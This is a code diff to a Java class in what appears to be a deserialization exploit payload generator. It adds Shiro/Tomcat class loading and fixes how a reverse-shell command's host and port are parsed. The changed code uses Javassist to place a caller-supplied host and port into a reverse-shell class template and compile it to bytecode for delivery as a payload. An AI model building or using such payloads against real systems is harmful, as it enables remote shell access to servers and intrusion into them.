@@ -27,16 +27,16 @@ public class CustomClass implements ObjectPayload<Object> {
             String parameter = command.substring(CommandConstant.COMMAND_SHIRO_TOMCAT_LOADCLASS.length());
             return TomcatShiroLoadClassTemplate.loadClassDataForTomcatShiro(parameter);
         } else if (command.toLowerCase().startsWith(CommandConstant.COMMAND_REVERSESHELL)) {
-            String ipAndPort = command.substring(CommandConstant.COMMAND_SHIRO_TOMCAT_LOADCLASS.length());
+            String ipAndPort = command.substring(CommandConstant.COMMAND_REVERSESHELL.length());
             String[] parts = ipAndPort.split(":");
             ClassPool pool = ClassPool.getDefault();
-            CtClass clazz = pool.get(ReverseShellClassTemplate.class.getName());
-            clazz.replaceClassName(clazz.getName(), tmplClazzName);
-            Reflections.setFieldValue(clazz, "host", CtField.Initializer.constant(parts[0]));
-            Reflections.setFieldValue(clazz, "port", CtField.Initializer.constant(Integer.parseInt(parts[1])));
-            clazz.defrost(); // 允许对类进行修改（defrost 解冻状态）
-            clazz.getClassFile().setVersionToJava5(); // JDK5以提高兼容性
-            classBytes = clazz.toBytecode();
+            CtClass ctClass = pool.get(ReverseShellClassTemplate.class.getName());
+            ctClass.replaceClassName(ctClass.getName(), tmplClazzName);
+            Reflections.setFieldValueForCtClass(ctClass, "host", CtField.Initializer.constant(parts[0]));
+            Reflections.setFieldValueForCtClass(ctClass, "port", CtField.Initializer.constant(Integer.parseInt(parts[1])));
+            ctClass.defrost(); // 允许对类进行修改（defrost 解冻状态）
+            ctClass.getClassFile().setVersionToJava5(); // JDK5以提高兼容性
+            classBytes = ctClass.toBytecode();
         } else {
             String cmd = CommandlUtil.getCmd(command);
             //简单的字节码处理
